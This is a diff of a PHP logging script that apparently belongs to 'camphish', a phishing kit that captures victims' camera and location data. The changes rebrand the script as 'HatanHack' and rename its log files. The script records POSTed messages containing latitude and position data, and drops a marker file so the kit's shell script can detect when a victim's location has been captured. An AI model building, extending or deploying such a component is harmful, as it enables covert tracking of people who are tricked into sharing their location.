@@ -1,5 +1,5 @@
 <?php
-// Simple debug logging script
+// HatanHack Custom Debug Logging Script
 if(isset($_POST['message'])) {
     $message = $_POST['message'];
     $date = date('Y-m-d H:i:s');
@@ -27,13 +27,15 @@ if(isset($_POST['message'])) {
         strpos($message, 'Latitude:') !== false || 
         strpos($message, 'Position obtained') !== false
     )) {
-        // Log to location_debug.log
-        $location_log = fopen("location_debug.log", "a");
+        // Log to our custom location debug log file
+        $location_log = fopen("hatan_location_debug.log", "a");
         fwrite($location_log, "[$date] $message\n");
         fclose($location_log);
         
         // Also create a marker file for the shell script to detect
-        file_put_contents("LocationLog.log", "Location data captured\n", FILE_APPEND);
+        // NOTE: camphish.sh detects location via 'current_location.txt' or location_* files now, 
+        // but we keep this marker for backward compatibility or potential custom logic.
+        file_put_contents("hatan_location_marker.log", "Location data captured\n", FILE_APPEND);
     }
     
     // Return success
@@ -44,4 +46,4 @@ if(isset($_POST['message'])) {
     header('Content-Type: application/json');
     echo json_encode(['status' => 'error', 'message' => 'No message provided']);
 }
-?> 
+?>
